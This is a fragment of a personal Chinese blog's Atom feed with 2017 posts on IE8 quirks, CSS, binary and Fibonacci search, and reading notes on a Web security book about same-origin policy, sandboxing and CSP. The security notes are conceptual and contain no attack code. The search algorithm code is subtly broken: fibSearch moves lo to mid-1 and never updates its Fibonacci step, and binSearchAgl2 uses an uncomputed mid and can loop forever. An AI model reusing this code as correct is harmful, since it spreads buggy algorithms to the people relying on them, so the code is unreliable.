    <link href="http://www.wanglinzhizhi.me/2017/01/21/ie8%E7%9A%84%20%E5%A5%87%E6%80%AA%E7%9A%84%E5%9C%B0%E6%96%B9./"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/ie8的 奇怪的地方./</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ie8的-奇怪的地方"><a href="#ie8的-奇怪的地方" class="headerlink" title="ie8的 奇怪的地方"></a>ie8的 奇怪的地方</h2><ul>
<li>你对其元素设置z-index值,他会按照其父元素的位置确定而不是他本身的位置. <strong>人家拼的是爹.</strong></li>
</ul>
<p>  ​</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ie8的-奇怪的地方&quot;&gt;&lt;a href=&quot;#ie8的-奇怪的地方&quot; class=&quot;headerlink&quot; title=&quot;ie8的 奇怪的地方&quot;&gt;&lt;/a&gt;ie8的 奇怪的地方&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;你对其元素设置z-index值,他会按照其父元素的位置确定而不是
    
    </summary>
    
      <category term="Web前端" scheme="http://www.wanglinzhizhi.me/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Web前端" scheme="http://www.wanglinzhizhi.me/tags/Web%E5%89%8D%E7%AB%AF/"/>
    
      <category term="IE8" scheme="http://www.wanglinzhizhi.me/tags/IE8/"/>
    
  </entry>
  
  <entry>
    <title>结构与样式分离</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%BB%93%E6%9E%84%E4%B8%8E%E6%A0%B7%E5%BC%8F%E5%88%86%E7%A6%BB/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/结构与样式分离/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="结构与样式分离"><a href="#结构与样式分离" class="headerlink" title="结构与样式分离"></a>结构与样式分离</h2><p><strong>结构与样式分离</strong></p>
<p><strong>结构与样式分离</strong></p>
<p><strong>结构与样式分离</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;结构与样式分离&quot;&gt;&lt;a href=&quot;#结构与样式分离&quot; class=&quot;headerlink&quot; title=&quot;结构与样式分离&quot;&gt;&lt;/a&gt;结构与样式分离&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;结构与样式分离&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;结构与样式分离&lt;/s
    
    </summary>
    
      <category term="前端架构" scheme="http://www.wanglinzhizhi.me/categories/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/"/>
    
    
      <category term="架构" scheme="http://www.wanglinzhizhi.me/tags/%E6%9E%B6%E6%9E%84/"/>
    
      <category term="前端架构" scheme="http://www.wanglinzhizhi.me/tags/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/"/>
    
      <category term="页面结构" scheme="http://www.wanglinzhizhi.me/tags/%E9%A1%B5%E9%9D%A2%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>算法：BinarySearch和FibSearch</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%AE%97%E6%B3%95%EF%BC%9ABinarySearch%20%20%E5%92%8C%20FibSearch/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/算法：BinarySearch  和 FibSearch/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-18T07:28:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="算法：BinarySearch-和-FibSearch"><a href="#算法：BinarySearch-和-FibSearch" class="headerlink" title="算法：BinarySearch  和 FibSearch"></a>算法：BinarySearch  和 FibSearch</h2><hr>

<p>​<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">binarySearch(<span class="keyword">int</span>[] A,<span class="keyword">int</span> e,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)&#123;</div><div class="line">  <span class="keyword">while</span>(lo&lt;hi)&#123;</div><div class="line">  	<span class="keyword">int</span> mid=(lo+hi)/<span class="number">2</span>;</div><div class="line">    <span class="keyword">if</span>(e&lt;A[mid])</div><div class="line">      hi=mid;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(A[mid]&lt;e)</div><div class="line">      lo=mid+<span class="number">1</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="keyword">return</span> mid;</div><div class="line">  &#125;<span class="comment">//while end</span></div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;<span class="comment">//code end</span></div><div class="line"></div><div class="line">​</div></pre></td></tr></table></figure></p>
<p>以上是简单的二分查找，对于有序数列，我们常用的是二分查找对其进行遍历，查找到相应所需要的元素的位置。当元素不存在时，返回-1.</p>
<p>算法的时间复杂度是我们愿意欣然接受的O(logn).</p>
<p>这就是最好的了吗？不是，还有比二分查找更好的算法FibSearch。</p>
<p>​<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">fibSearch</span><span class="params">(<span class="keyword">int</span>[] A,<span class="keyword">int</span> e,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</div><div class="line">  <span class="function">Fib <span class="title">fib</span><span class="params">(hi-lo)</span></span>;</div><div class="line">  <span class="keyword">while</span>(lo&lt;hi)&#123;</div><div class="line">    <span class="keyword">int</span> mid=lo+fib.get()<span class="number">-1</span>;</div><div class="line">    <span class="keyword">if</span>(e&lt;A[mid]) hi=mid;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(A[mid]&lt;e) lo=mid<span class="number">-1</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">return</span> mid;</div><div class="line">  &#125;<span class="comment">//while end</span></div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;<span class="comment">//code end</span></div><div class="line"></div><div class="line"><span class="comment">//Fibonacci 类</span></div><div class="line"><span class="keyword">class</span> Fib &#123; <span class="comment">//Fibonacci数列类</span></div><div class="line"><span class="keyword">private</span>:</div><div class="line">   <span class="keyword">int</span> f, g; <span class="comment">//f = fib(k - 1), g = fib(k)。均为int型，很快就会数值溢出</span></div><div class="line"><span class="keyword">public</span>:</div><div class="line">   Fib ( <span class="keyword">int</span> n ) <span class="comment">//初始化为不小于n的最小Fibonacci项</span></div><div class="line">   &#123; f = <span class="number">1</span>; g = <span class="number">0</span>; <span class="keyword">while</span> ( g &lt; n ) next(); &#125; <span class="comment">//fib(-1), fib(0)，O(log_phi(n))时间</span></div><div class="line">   <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">()</span>  </span>&#123; <span class="keyword">return</span> g; &#125; <span class="comment">//获取当前Fibonacci项，O(1)时间</span></div><div class="line">   <span class="function"><span class="keyword">int</span> <span class="title">next</span><span class="params">()</span> </span>&#123; g += f; f = g - f; <span class="keyword">return</span> g; &#125; <span class="comment">//转至下一Fibonacci项，O(1)时间</span></div><div class="line">   <span class="function"><span class="keyword">int</span> <span class="title">prev</span><span class="params">()</span> </span>&#123; f = g - f; g -= f; <span class="keyword">return</span> g; &#125; <span class="comment">//转至上一Fibonacci项，O(1)时间</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>以上是fibSearch的基本代码。</p>
<p>事实上，从代码可以看出，fibSearch的算法是基于二分查找的结构之上的。区别在于，每次对mid定位不再是取中点，而是取黄静分割点。这样做对性能的影响是，原来的二分查找BinarySearch的平均复杂段是 1.5*logn，可减低前面的常系数 1.5 降到 黄金分割率 (约为1.44）.</p>
<p>之所以会是这样，是因为 binarySearch 中左右两边分支时，进行的比较次数时不同的，左边比较次数比右边的比较次数少，那么虽然每次是平均从中间截断，但是效果并不是分摊，而是后面分摊的比较次数更多。所以可以用fibSearch将比较次数更少的左边截取更长的长度，这有点类似于哈夫曼编码的方式，将较小权值的分支分更深，而将将较大权值的分支放在更浅的位置已达到整体的权值最小。</p>
<p>另外一个发现是关于fibonacci数列的。以前只知道有 Fibonacci数列，但是没有想过它的用途，现在发现这货还是很有用的。而且原来Fibonacci 数列与黄金分割点之间存在相关关系。</p>
<p>tips，fibonacci数列千万不要使用递归来构造。 :)</p>
<hr>

<p>###update 2016.02.27</p>
<p>之前一直很忙（懒）导致之前貌似有个与二分查找有极大相关性的一个话题的个人领悟想写一写的，然而，现在忘了。。。</p>
<p>好吧，还是先记录下我现在想些的内容吧：</p>
<ol>
<li><p>对于比较次数的锱铢必较。其实上面的BinSearch算法如果不仔细考虑比较次数的问题，其实性能提升就无从谈起，我记得以前在复习《数据结构》这门课程的时候，做算法题很不理解为什么经常会有比较不同算法之间的比较次数的多少，觉得很无聊。（总觉得比较不同算法之间交换元素的次数的不同很容易理解，因为毕竟交换元素有的时候开销是明明白白摆在那里的，但是就比较次数有什么好计较的？？？），现在才知道当年还是太年轻。</p>
<p>我在闲着无聊的时候重新看了一下数据结构的内容，如果针对比较次数的限制，我们对BinSearch算法是可以进一步优化的，即使在向右跳转的时候和向左跳转方向都只需要相同的比较次数的思路。</p>
<p>怎么做呢？具体说来，其实只需要做及其微小的变化就可以了。mid=(low+high)/2;只是现在不需要进行A[mid]进行三次比较(大于，小于，等于)。而是将只考虑两种情况：a：e &lt; A[mid], b：A[mid]&lt;=e;</p>
<blockquote>
   <figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">&gt;</div><div class="line">&gt;    ( e &lt; A[mid] ) ? high = mid : low = mid;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<p>这样处理之后，算法中分支向左或向右都只需要1次比较。那么就出现了新的问题，这样做算法什么时候终止呢？是的，终止条件发生了变化，不再是当遍历到我们需要的e==A[mid]的时候返回，而是在折半到最后low&lt;high 才终止。也就是说，当e与A[mid]比较之后，将向量分为两部分[lo, mi)或[mi, hi),每一次比较从这两部分中选择一边深入下去，相同的故事一直进行直到最后不满足low&lt;high 循环条件才退出。</p>
<p>DSA如下：</p>
<blockquote>
   <figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">&gt;</div><div class="line">&gt;     binSearchAgl2(<span class="keyword">int</span>[] A,<span class="keyword">int</span> e,<span class="keyword">int</span> low,<span class="keyword">int</span> high)&#123;</div><div class="line">&gt;       <span class="keyword">while</span>(low&lt;high)&#123;</div><div class="line">&gt;         ( e &lt; A[mid] ) ? high = mid : low = mid;</div><div class="line">&gt;       &#125;<span class="comment">//while end</span></div><div class="line">&gt;       <span class="keyword">if</span>(e ==A[mid])</div><div class="line">&gt;         <span class="keyword">return</span> mid;</div><div class="line">&gt;       <span class="keyword">else</span></div><div class="line">&gt;         <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&gt;     &#125;<span class="comment">//code end</span></div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<p>这样做是否值得呢？优点不难看出，随着比较次数的减少，整体效率会有所上升，但是缺点也很明显，最好情况和最坏情况一样，都是等于平均情况下的效率。</p>
<p>对于上述三种排序思路，如何选择最优呢？和小时候做数学题一样，分情况讨论，二分排序问题，是输入敏感型的，对输入的向量（为简单，假设为向量）很敏感。</p>
<p>对于输入的向量，如果出现最好和最坏现象比较频繁，数据分布有明显的聚集现象，那么很显然，binSearch不是最好的选择，应该选择更看重平均效率的算法。</p>
<p>反之，对于有序数据向量来说，数据在向量中分布均匀，那么经典的binSearch将会是适合的。</p>
</li>
<li><p>好吧，终于到第二了，这次说什么都要先把主要的观点记下来，免得又忘了。</p>
<p>第二，是关于在数据结构中二分搜索的地位的评价的。</p>
<p>这几天闲着无聊，感觉什么都不做太浪费宝贵的人生了，于是我就把数据结构重新遍历了一边，个人观点，二分查找，基本上串连了整个数据结构的内容。类似一根穿针线，在整个数据结构中，时隐时现，重最初的向量的二分查找，到后面树的查找，再到BST(二叉平衡树)的查找算法，再到B-Tree，虽然拓扑结构和逻辑结构上有些不同，但是吧，说实话其实思路倒还真是——起码我觉得——差不多。具体的思路缕析慢慢来，先补另外几篇……</p>
<p>​</p>
</li>
</ol>
<p>​</p>
<p>​</p>
<p>参考资料：《数据结构》 邓俊辉 清华大学出版社</p>
<p>by wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;算法：BinarySearch-和-FibSearch&quot;&gt;&lt;a href=&quot;#算法：BinarySearch-和-FibSearch&quot; class=&quot;headerlink&quot; title=&quot;算法：BinarySearch  和 FibSearch&quot;&gt;&lt;/a&gt;算法：B
    
    </summary>
    
      <category term="算法" scheme="http://www.wanglinzhizhi.me/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="数据结构" scheme="http://www.wanglinzhizhi.me/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="程序员的浪漫" scheme="http://www.wanglinzhizhi.me/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    
      <category term="C++" scheme="http://www.wanglinzhizhi.me/tags/C/"/>
    
      <category term="二分查找" scheme="http://www.wanglinzhizhi.me/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
      <category term="Fibonacci查找" scheme="http://www.wanglinzhizhi.me/tags/Fibonacci%E6%9F%A5%E6%89%BE/"/>
    
      <category term="查找算法" scheme="http://www.wanglinzhizhi.me/tags/%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/"/>
    
      <category term="DSA" scheme="http://www.wanglinzhizhi.me/tags/DSA/"/>
    
  </entry>
  
  <entry>
    <title>-webkit-backface-visibility</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/-webkit-backface-visibility/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/-webkit-backface-visibility/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-19T01:46:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="webkit-backface-visibility"><a href="#webkit-backface-visibility" class="headerlink" title="-webkit-backface-visibility"></a>-webkit-backface-visibility</h2><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">-webkit-backface-visibility</span><span class="selector-pseudo">:hidden</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;webkit-backface-visibility&quot;&gt;&lt;a href=&quot;#webkit-backface-visibility&quot; class=&quot;headerlink&quot; title=&quot;-webkit-backface-visibility&quot;&gt;&lt;/a&gt;-webkit
    
    </summary>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/categories/Web/"/>
    
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
      <category term="Web 3D" scheme="http://www.wanglinzhizhi.me/tags/Web-3D/"/>
    
      <category term="移动Web" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8Web/"/>
    
  </entry>
  
  <entry>
    <title>白帽子讲Web安全 读书笔记</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%20%20%E5%90%B4%E7%BF%B0%E6%B8%85%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/白帽子讲Web安全  吴翰清 读书笔记/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-18T07:27:14.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="白帽子讲Web安全"><a href="#白帽子讲Web安全" class="headerlink" title="白帽子讲Web安全"></a>白帽子讲Web安全</h3><p>吴翰清</p>
<hr>

<h3 id="1-5-安全三要素"><a href="#1-5-安全三要素" class="headerlink" title="1.5 安全三要素"></a>1.5 安全三要素</h3><p>安全三要素是安全的基本组成元素，分别是机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。</p>
<p><hr></p>
<h3 id="1-6-4-设计安全方案"><a href="#1-6-4-设计安全方案" class="headerlink" title="1.6.4 设计安全方案"></a>1.6.4 设计安全方案</h3><p>很多人认为，安全和业务是冲突的，因为往往为了安全，要牺牲业务的一些易用性或者性能，笔者不太赞同这种观点。从产品的角度来说，安全也应该是产品的一种属性。</p>
<p>产品需求，尤其是商业需求，是用户真正想要的东西，是业务的意义所在，在设计安全方案时应该尽可能地不要改变商业需求的初衷。<br>注: 在设计安全方案时应尽可能地不要改变商业需求的初衷</p>
<p>每当系统里的软件有什么敏感动作时，UAC就会弹出来询问用户是否允许该行为。这个功能在Vista众多失败的原因中是被人诟病最多的一个。如果用户能够分辨什么样的行为是安全的，那么还要安全软件做什么？同样的问题出现在很多主动防御的桌面安全保护软件中，它们动辄弹出个对话框询问用户是否允许目标的行为，这是非常荒谬的用户体验。</p>
<p><hr></p>
<h3 id="1-7-1-Secure-By-Default原则"><a href="#1-7-1-Secure-By-Default原则" class="headerlink" title="1.7.1 Secure By Default原则"></a>1.7.1 <code>Secure By Default</code>原则</h3><p>这个规范的制定，也可以选择白名单的思想来实现。按照白名单的思想，应该根据业务需求，列出一个允许使用的软件以及软件版本的清单，在此清单外的软件则禁止使用。</p>
<p>通配符<code>*</code>，代表来自任意域的Flash都能访问本域的数据，因此就造成了安全隐患。所以在选择使用白名单时，需要注意避免出现类似通配符<code>*</code>的问题。</p>
<p>最小权限原则也是安全设计的基本原则之一。最小权限原则要求系统只授予主体必要的权限，而不要过度授权，这样能有效地减少系统、网络、应用、数据库出错的机会。</p>
<p><hr></p>
<h3 id="1-7-2-纵深防御原则"><a href="#1-7-2-纵深防御原则" class="headerlink" title="1.7.2 纵深防御原则"></a>1.7.2 纵深防御原则</h3><p>常见的入侵案例中，大多数是利用Web应用的漏洞，攻击者先获得一个低权限的webshell，然后通过低权限的webshell上传更多的文件，并尝试执行更高权限的系统命令，尝试在服务器上提升权限为root；接下来攻击者再进一步尝试渗透内网，比如数据库服务器所在的网段。</p>
<p>对于XSS防御，对系统取得的用户输入进行过滤其实是不太合适的，因为XSS真正产生危害的场景是在用户的浏览器上，或者说服务器端输出的HTML页面，被注入了恶意代码。只有在拼装HTML时输出，系统才能获得HTML上下文的语义，才能判断出是否存在误杀等情况。所以“在正确的地方做正确的事情”，也是纵深防御的一种含义——必须把防御方案放到最合适的地方去解决。（XSS防御的更多细节请参考“跨站脚本攻击”一章。</p>
<p><hr></p>
<h3 id="1-7-3-数据与代码分离原则"><a href="#1-7-3-数据与代码分离原则" class="headerlink" title="1.7.3 数据与代码分离原则"></a>1.7.3 数据与代码分离原则</h3><p>实际上，缓冲区溢出，也可以认为是程序违背了这一原则的后果——程序在栈或者堆中，将用户数据当做代码执行，混淆了代码与数据的边界，从而导致安全问题的发生。</p>
<p>在Web安全中，由“注入”引起的问题比比皆是，如XSS、SQL Injection、CRLF Injection、X-Path Injection等。此类问题均可以根据“数据与代码分离原则”设计出真正安全的解决方案，因为这个原则抓住了漏洞形成的本质原因。</p>
<p><hr></p>
<h3 id="1-7-4-不可预测性原则"><a href="#1-7-4-不可预测性原则" class="headerlink" title="1.7.4 不可预测性原则"></a>1.7.4 不可预测性原则</h3><p>微软的Windows系统用户多年来深受缓冲区溢出之苦，因此微软在Windows的新版本中增加了许多对抗缓冲区溢出等内存攻击的功能。微软无法要求运行在系统中的软件没有漏洞，因此它采取的做法是让漏洞的攻击方法失效。比如，使用DEP来保证堆栈不可执行，使用ASLR让进程的栈基址随机变化，从而使攻击程序无法准确地猜测到内存地址，大大提高了攻击的门槛。</p>
<p>在ASLR的控制下，一个程序每次启动时，其进程的栈基址都不相同，具有一定的随机性，对于攻击者来说，这就是“不可预测性”</p>
<hr>

<h3 id="2-1-同源策略"><a href="#2-1-同源策略" class="headerlink" title="2.1 同源策略"></a>2.1 同源策略</h3><p>同源策略（Same Origin Policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略的基础之上的，浏览器只是针对同源策略的一种实现。</p>
<p>浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。</p>
<p>这一策略极其重要，试想如果没有同源策略，可能a.com的一段JavaScript脚本，在b.com未曾加载此脚本时，也可以随意涂改b.com的页面（在浏览器的显示中）。为了不让浏览器的页面行为发生混乱，浏览器提出了“Origin”（源）这一概念，来自不同Origin的对象无法互相干扰</p>
<p>浏览器中JavaScript的同源策略（当JavaScript被浏览器认为来自不同源时，请求被拒绝）</p>
<p>影响“源”的因素有：host（域名或IP地址，如果是IP地址则看做一个根域名）、子域名、端口、协议。</p>
<p>需要注意的是，对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载JavaScript页面所在的域是什么。</p>
<p>换言之，a.com通过以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script src=http://b.com/b.js &gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>加载了b.com上的b.js，但是b.js是运行在a.com页面中的，因此对于当前打开的页面（a.com页面）来说，b.js的Origin就应该是a.com而非b.com。</p>
<p>在浏览器中，<code>&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;</code>等标签都可以跨域加载资源，而不受同源策略的限制。这些带“src”属性的标签每次加载时，实际上是由浏览器发起了一次GET请求。不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。</p>
<p>但XMLHttpRequest受到同源策略的约束，不能跨域访问资源，在AJAX应用的开发中尤其需要注意这一点。</p>
<p>如果XMLHttpRequest能够跨域访问资源，则可能会导致一些敏感数据泄露，比如CSRF的token，从而导致发生安全问题。</p>
<p>但是互联网是开放的，随着业务的发展，跨域请求的需求越来越迫切，因此W3C委员会制定了XMLHttpRequest跨域访问标准。它需要通过目标域返回的HTTP头来授权是否允许跨域访问，因为HTTP头对于JavaScript来说一般是无法控制的，所以认为这个方案可以实施。注意：这个跨域访问方案的安全基础就是信任“JavaScript无法控制该HTTP头”，如果此信任基础被打破，则此方案也将不再安全。</p>
<p>对于浏览器来说，除了DOM、Cookie、XMLHttpRequest会受到同源策略的限制外，浏览器加载的一些第三方插件也有各自的同源策略。最常见的一些插件如Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。</p>
<p>以Flash为例，它主要通过目标网站提供的crossdomain.xml文件判断是否允许当前“源”的Flash跨域访问目标资源。<br>以www.qq.com的策略文件为例，当浏览器在任意其他域的页面里加载了Flash后，如果对www.qq.com发起访问请求，Flash会先检查www.qq.com上此策略文件是否存在。如果文件存在，则检查发起请求的域是否在许可范围内。</p>
<p>在这个策略文件中，只有来自<code>*.qq.com</code>和 <code>*.gtimg.com</code>域的请求是被允许的。依靠这种方式，从Origin的层面上控制了Flash行为的安全性。</p>
<p>浏览器的同源策略是浏览器安全的基础，在本书后续章节中提到的许多客户端脚本攻击，都需要遵守这一法则，因此理解同源策略对于客户端脚本攻击有着重要意义。同源策略一旦出现漏洞被绕过，也将带来非常严重的后果，很多基于同源策略制定的安全方案都将失去效果。</p>
<p><hr></p>
<h3 id="2-2-浏览器沙箱"><a href="#2-2-浏览器沙箱" class="headerlink" title="2.2 浏览器沙箱"></a>2.2 浏览器沙箱</h3><p>浏览器的多进程架构，将浏览器的各个功能模块分开，各个浏览器实例分开，当一个进程崩溃时，也不会影响到其他的进程。</p>
<p>Google Chrome是第一个采取多进程架构的浏览器。Google Chrome的主要进程分为：浏览器进程、渲染进程、插件进程、扩展进程。插件进程如flash、java、pdf等与浏览器进程严格隔离，因此不会互相影响。</p>
<p>渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程通信、与操作系统通信都需要通过IPC channel，在其中会进行一些安全检查。</p>
<p>Sandbox即沙箱，计算机技术发展到今天，Sandbox已经成为泛指“资源隔离类模块”的代名词。Sandbox的设计目的一般是为了让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。如果一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道，比如经过封装的API来完成，在这些API中会严格检查请求的合法性。</p>
<p>Sandbox的应用范围非常广泛。比如一个提供hosting服务的共享主机环境，假设支持用户上传PHP、Python、Java等语言的代码，为了防止用户代码破坏系统环境，或者是不同用户之间的代码互相影响，则应该设计一个Sandbox对用户代码进行隔离。Sandbox需要考虑用户代码针对本地文件系统、内存、数据库、网络的可能请求，可以采用默认拒绝的策略，对于有需要的请求，则可以通过封装API的方式实现。</p>
<p>Google Chrome实现了一个相对完整的Sandbox：</p>
<p>IE 8也采取了多进程架构，每一个Tab页即是一个进程</p>
<p>多进程架构最明显的一个好处是，相对于单进程浏览器，在发生崩溃时，多进程浏览器只会崩溃当前的Tab页，而单进程浏览器则会崩溃整个浏览器进程。</p>
<p>但是浏览器安全是一个整体，在现今的浏览器中，虽然有多进程架构和Sandbox的保护，但是浏览器所加载的一些第三方插件却往往不受Sandbox管辖。比如近年来在Pwn2Own大会上被攻克的浏览器，往往都是由于加载的第三方插件出现安全漏洞导致的。Flash、Java、PDF、.Net Framework在近年来都成为浏览器攻击的热点。</p>
<p>也许在不远的未来，在浏览器的安全模型中会更加重视这些第三方插件，不同厂商之间会就安全达成一致的标准，也只有这样，才能将这个互联网的入口打造得更加牢固</p>
<p><hr></p>
<h3 id="2-3-恶意网址拦截"><a href="#2-3-恶意网址拦截" class="headerlink" title="2.3 恶意网址拦截"></a>2.3 恶意网址拦截</h3><p>上节提到了“挂马”攻击方式能够破坏浏览器安全，在很多时候，“挂马”攻击在实施时会在一个正常的网页中通过<code>&lt;script&gt;</code>或者<code>&lt;iframe&gt;</code>等标签加载一个恶意网址。</p>
<p>为了保护用户安全，浏览器厂商纷纷推出了各自的拦截恶意网址功能。目前各个浏览器的拦截恶意网址的功能都是基于“黑名单”的。</p>
<p>恶意网址拦截的工作原理很简单，一般都是浏览器周期性地从服务器端获取一份最新的恶意网址黑名单，如果用户上网时访问的网址存在于此黑名单中，浏览器就会弹出一个警告页面。</p>
<p>常见的恶意网址分为两类：一类是挂马网站，这些网站通常包含有恶意的脚本如JavaScript或Flash，通过利用浏览器的漏洞（包括一些插件、控件漏洞）执行shellcode，在用户电脑中植入木马；另一类是钓鱼网站，通过模仿知名网站的相似页面来欺骗用户。<br>要识别这两种网站，需要建立许多基于页面特征的模型，而这些模型显然是不适合放在客户端的，因为这会让攻击者得以分析、研究并绕过这些规则。同时对于用户基数巨大的浏览器来说，收集用户访问过的历史记录也是一种侵犯隐私的行为，且数据量过于庞大。<br>基于这两个原因，浏览器厂商目前只是以推送恶意网址黑名单为主，浏览器收到黑名单后，对用户访问的黑名单进行拦截；而很少直接从浏览器收集数据，或者在客户端建立模型。现在的浏览器多是与专业的安全厂商展开合作，由安全厂商或机构提供恶意网址黑名单。</p>
<p>一些有实力的浏览器厂商，比如Google和微软，由于本身技术研发实力较强，且又掌握了大量的用户数据，因此自建有安全团队做恶意网址识别工作，用以提供浏览器所使用的黑名单。对于搜索引擎来说，这份黑名单也是其核心竞争力之一。</p>
<p>PhishTank是互联网上免费提供恶意网址黑名单的组织之一，它的黑名单由世界各地的志愿者提供，且更新频繁。</p>
<p>类似地，Google也公开了其内部使用的SafeBrowsing API，任何组织或个人都可以在产品中接入，以获取Google的恶意网址库。</p>
<p>除了恶意网址黑名单拦截功能外，主流浏览器都开始支持EV SSL证书（Extended Validation SSL Certificate），以增强对安全网站的识别。<br>EVSSL证书是全球数字证书颁发机构与浏览器厂商一起打造的增强型证书，其主要特色是浏览器会给予EVSSL证书特殊待遇。EVSSL证书也遵循X509标准，并向前兼容普通证书。如果浏览器不支持EV模式，则会把该证书当做普通证书；如果浏览器支持（需要较新版本的浏览器）EV模式，则会在地址栏中特别标注。</p>
<p><hr></p>
<h3 id="2-4-高速发展的浏览器安全"><a href="#2-4-高速发展的浏览器安全" class="headerlink" title="2.4 高速发展的浏览器安全"></a>2.4 高速发展的浏览器安全</h3><p>浏览器安全”领域涵盖的范围非常大，且今天浏览器仍然在不断更新，不断推出新的安全功能。<br>为了在安全领域获得竞争力，微软率先在IE 8中推出了XSS Filter功能，用以对抗反射型XSS。一直以来，XSS（跨站脚本攻击）都被认为是服务器端应用的漏洞，应该由服务器端应用在代码中修补，而微软率先推出了这一功能，就使得IE 8在安全领域极具特色。</p>
<p>当用户访问的URL中包含了XSS攻击的脚本时，IE就会修改其中的关键字符使得攻击无法成功完成，并对用户弹出提示框。</p>
<p>这些规则可以捕获URL中的XSS攻击，其他的安全产品可以借鉴。</p>
<p>而Firefox也不甘其后，在Firefox 4中推出了Content Security Policy（CSP）。这一策略是由安全专家Robert Hanson最早提出的，其做法是由服务器端返回一个HTTP头，并在其中描述页面应该遵守的安全策略。</p>
<p>由于XSS攻击在没有第三方插件帮助的情况下，无法控制HTTP头，所以这项措施是可行的。</p>
<p>使用CSP的方法如下，插入一个HTTP返回头：</p>
<p><code>X-Content-Security-Policy: policy</code></p>
<p>其中policy的描述极其灵活，比如：</p>
<p>CSP的设计理念无疑是出色的，但是CSP的规则配置较为复杂，在页面较多的情况下，很难一个个配置起来，且后期维护成本也非常巨大，这些原因导致CSP未能得到很好的推广。</p>
<p>比如，浏览器地址栏对于畸形URL的处理就各自不同。在IE中，如下URL将被正常解析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.google.com\abc</div></pre></td></tr></table></figure>
<p>会变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">www.google.com/abc</div></pre></td></tr></table></figure>
<p>具有同样行为的还有Chrome，将“\”变为标准的“/”。</p>
